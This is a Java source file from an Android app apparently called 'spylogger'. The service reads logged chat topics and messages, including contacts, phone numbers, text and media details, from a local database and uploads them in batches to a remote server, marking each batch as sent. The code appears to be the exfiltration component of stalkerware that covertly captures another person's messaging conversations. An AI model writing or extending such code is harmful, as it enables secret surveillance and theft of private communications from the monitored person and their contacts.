package com.gravatasufoca.spylogger.services;

import android.content.Context;
import android.util.Log;

import com.gravatasufoca.spylogger.dao.DatabaseHelper;
import com.gravatasufoca.spylogger.helpers.TaskComplete;
import com.gravatasufoca.spylogger.model.Mensagem;
import com.gravatasufoca.spylogger.model.TipoMensagem;
import com.gravatasufoca.spylogger.model.TipoMidia;
import com.gravatasufoca.spylogger.model.Topico;
import com.gravatasufoca.spylogger.vos.RespostaRecebimentoVO;
import com.j256.ormlite.dao.Dao;
import com.j256.ormlite.dao.GenericRawResults;
import com.j256.ormlite.stmt.UpdateBuilder;

import java.sql.SQLException;
import java.util.ArrayList;
import java.util.Collections;
import java.util.Date;
import java.util.HashMap;
import java.util.Iterator;
import java.util.List;
import java.util.Map;
import java.util.Set;

import retrofit2.Call;
import retrofit2.Response;

/**
 * Created by bruno on 02/12/16.
 */

public class SendMensagensService extends SendDataService<RespostaRecebimentoVO> {
    private Context context;

    public SendMensagensService(Context context, TaskComplete handler) {
        super(handler);
        this.context = context;
    }

    public boolean enviarTopicos() {
        DatabaseHelper dbHelper = new DatabaseHelper(context);
        try {
            Dao<Topico, Integer> daoTopicos = dbHelper.getDao(Topico.class);
            Dao<Mensagem, Integer> daoMensagem = dbHelper.getDao(Mensagem.class);

            //limpar TODO: retirar daqui
            UpdateBuilder<Topico,Integer> up=daoTopicos.updateBuilder();
            up.updateColumnValue("enviado",false);
            up.update();
            UpdateBuilder<Mensagem,Integer> up2=daoMensagem.updateBuilder();
            up2.updateColumnValue("enviada",false);
            up2.update();

            GenericRawResults<String[]> raws = daoTopicos.queryRaw("select id,nome,grupo,tipoMensagem from topico where enviado=0 ");
            List<Topico> topicos = new ArrayList<>();
            int contador = 0;
            Iterator<String[]> iterator=raws.iterator();
            while (iterator.hasNext()) {
                String[] resultRaw=iterator.next();
                topicos.add(new Topico.TopicoBuilder()
                        .setId(Integer.valueOf(resultRaw[0]))
                        .setNome(resultRaw[1])
                        .setGrupo("1".equals(resultRaw[2]))
                        .build(TipoMensagem.values()[Integer.parseInt(resultRaw[3])])
                );
                contador++;
                if(iterator.hasNext()){
                    if(contador==500) {
                        contador = 0;
                        enviarTopicos(topicos);
                        topicos = new ArrayList<>();
                    }
                }else{
                    enviarTopicos(topicos);
                }
            }

            Map<String, Integer> colunas = Mensagem.columns();

            raws = daoMensagem.queryRaw("select " + getColunas(colunas) + " from mensagem where enviada=0 ");
            List<Mensagem> mensagens = new ArrayList<>();
            contador = 0;
            iterator=raws.iterator();
            while (iterator.hasNext()) {
                String[] resultRaw=iterator.next();
                try {
                    Mensagem mensagem = new Mensagem.MensagemBuilder()
                            .setId(Integer.valueOf(resultRaw[colunas.get("id")]))
                            .setContato(resultRaw[colunas.get("contato")])
                            .setTipoMidia(resultRaw[colunas.get("tipoMidia")] == null ? TipoMidia.CONTATO : TipoMidia.valueOf(resultRaw[colunas.get("tipoMidia")]))
                            .setRemetente("1".equals(resultRaw[colunas.get("remetente")]))
                            .setMediaMime(resultRaw[colunas.get("midiaMime")])
                            .setNumeroContato(resultRaw[colunas.get("numeroContato")])
                            .setTamanhoArquivo(resultRaw[colunas.get("tamanhoArquivo")] != null && resultRaw[colunas.get("tamanhoArquivo")].length() > 0 ? Long.parseLong(resultRaw[colunas.get("tamanhoArquivo")]) : null)
                            .setTexto(resultRaw[colunas.get("texto")])
                            .setTopico(new Topico.TopicoBuilder().setId(Integer.valueOf(resultRaw[colunas.get("topico_id")])).build(null))
                            .setData(new Date(Long.parseLong(resultRaw[colunas.get("data")])))
                            .setDataRecebida(new Date(Long.parseLong(resultRaw[colunas.get("dataRecebida")])))
                            .build();
                    mensagens.add(mensagem);
                }catch (Exception e){
                    e.printStackTrace();
                }
                contador++;
                if(iterator.hasNext()){
                    if(contador==10000) {
                        contador = 0;
                        enviarMensagens(mensagens);
                        mensagens = new ArrayList<>();
                    }
                }else{
                    enviarMensagens(mensagens);
                }
            }

        } catch (SQLException e) {
            Log.e(this.getClass().getSimpleName(), e.getMessage());
        }


        return true;
    }

    private String getColunas(Map<String, Integer> colunas) {
        Set<String> keys = colunas.keySet();
        StringBuffer cols = new StringBuffer();
        Map<Integer, String> inverso = new HashMap<>();
        for (String col : keys) {
            Integer a = colunas.get(col);
            inverso.put(a, col);
        }
        List<Integer> ids = new ArrayList<>(inverso.keySet());
        Collections.sort(ids);
        for (Integer id : ids) {
            String tmp = inverso.get(id);
            cols.append(cols.toString().isEmpty() ? "" : ",").append(tmp);

        }
        return cols.toString();
    }

    private void enviarMensagens(List<Mensagem> mensagens) {
        Call<RespostaRecebimentoVO> resp = sendApi.enviarMensagens(mensagens);//
        resp.enqueue(this);
    }

    private void enviarTopicos(List<Topico> topicos) {
        Call<RespostaRecebimentoVO> resp = sendApi.enviarTopicos(topicos);
        resp.enqueue(this);
    }

    @Override
    public void onResponse(Call<RespostaRecebimentoVO> call, Response<RespostaRecebimentoVO> response) {
        RespostaRecebimentoVO resposta = response.body();
        if (resposta != null) {
            try {
                DatabaseHelper dbHelper = new DatabaseHelper(context);

                if (resposta.getTipo().equalsIgnoreCase("topico")) {
                    Dao<Topico, Integer> daoTopicos = dbHelper.getDao(Topico.class);

                    final UpdateBuilder<Topico, Integer> ub = daoTopicos.updateBuilder();
                    ub.where().in("id", resposta.getIds());
                    ub.updateColumnValue("enviado", true);
                    Thread t = new Thread(new Runnable() {
                        @Override
                        public void run() {
                            try {
                                ub.update();
                            } catch (SQLException e) {
                                Log.e(SendMensagensService.class.getSimpleName(), e.getMessage());
                            }
                        }
                    });
                    t.start();
                } else {
                    Dao<Mensagem, Integer> daoMensagem = dbHelper.getDao(Mensagem.class);
                    final UpdateBuilder<Mensagem, Integer> ub = daoMensagem.updateBuilder();
                    ub.where().in("id", resposta.getIds());
                    ub.updateColumnValue("enviada", true);
                    Thread t = new Thread(new Runnable() {
                        @Override
                        public void run() {
                            try {
                                ub.update();
                            } catch (SQLException e) {
                                Log.e(SendMensagensService.class.getSimpleName(), e.getMessage());
                            }
                        }
                    });
                    t.start();
                }


            } catch (SQLException e) {
                Log.e(this.getClass().getSimpleName(), e.getMessage());
            }
        }
    }
}
